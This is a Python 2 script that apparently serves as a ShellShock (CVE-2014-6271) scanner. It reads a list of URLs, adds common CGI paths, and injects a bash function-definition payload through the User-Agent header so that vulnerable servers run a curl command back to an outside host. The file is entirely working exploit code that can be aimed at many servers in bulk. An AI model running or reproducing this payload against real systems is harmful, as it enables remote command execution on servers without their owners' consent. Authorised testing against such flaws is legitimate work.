#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pylint: disable=C0103
# pylint: disable=C0413
# pylint: disable=W0621
# pylint: disable=W0702

'''
Script that checks if remote web servers are vulnarable to ShellShock attack (CVE-2014-6271).

Dependencies:
    * python2
        # Debian/Ubuntu: apt-get install python
        # Fedora: dnf install python

    * mechanize
        # Debian/Ubuntu: apt-get install python-mechanize
        # Fedora: dnf install python2-mechanize
'''

EXPLOIT = '() { :;}; echo Content-Type: text/plain ; echo ; /bin/bash -c "'
COMMAND = 'curl -L -s -I http://www.example.com/shell-shock'

import os
import socket
import sys
from urlparse import urlparse
from mechanize import Browser

if len(sys.argv) != 2:
    print 'Usage: ' + sys.argv[0] + ' [filename]'
    print "    * filename - File that contains list of urls.\n"
    sys.exit(1)

URLS_FILE = sys.argv[1]

if not os.path.isfile(URLS_FILE):
    print 'Error: file ' + '"' + URLS_FILE + '"' + " doesn't exist.\n"
    sys.exit(1)

COMMON_PATHS = [
    'bin',
    'bin/status',
    'cgi',
    'cgi/status',
    'cgi-bin',
    'cgi-bin/status'
]

URLS = list()

with open(URLS_FILE, 'r') as content:
    for url in content:
        url = url.strip()
        if url not in URLS:
            URLS.append(url)

def resolve_url(url):
    '''Function that checks if hostname is an IP or domain, if it's domain then returns IP.'''
    parsed_url = urlparse(url)
    netloc = parsed_url.netloc

    try:
        socket.inet_aton(netloc)
    except socket.error:
        ip = socket.gethostbyname(netloc)
        url = parsed_url._replace(netloc=ip).geturl()
        return url

    return None

def generate_urls(urls):
    '''Generates list of urls with common paths to increase chance of hitting right spot.'''
    generated_urls = list()

    for url in urls:
        if not url.endswith('/'):
            url += '/'

        generated_urls.append(url)

        for common_path in COMMON_PATHS:
            generated_urls.append(url + common_path)

    return generated_urls

if bool(URLS):
    for url in URLS:
        if url.find('cgi') == -1 or url.find('bin') == -1:
            base_urls = [url]

            if resolve_url(url):
                base_urls.append(resolve_url(url))

            generated_urls = generate_urls(base_urls)

            for generated_url in generated_urls:
                print '> Sending shock to: ' + generated_url
                generated_command = COMMAND + ' -A ' + generated_url
                br = Browser()
                br.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]

                try:
                    RESPONSE = br.open(generated_url, None, 3)
                except KeyboardInterrupt:
                    sys.exit(0)
                except:
                    pass
        else:
            base_urls = [url]

            if resolve_url(url):
                base_urls.append(resolve_url(url))

            for base_url in base_urls:
                try:
                    generated_command = COMMAND + ' -A ' + base_url
                    br = Browser()
                    br.addheaders = [('User-agent', EXPLOIT + generated_command + '"')]
                    RESPONSE = br.open(base_url, None, 3)
                except KeyboardInterrupt:
                    sys.exit(0)    
                except:
                    pass

print '> Finished.'
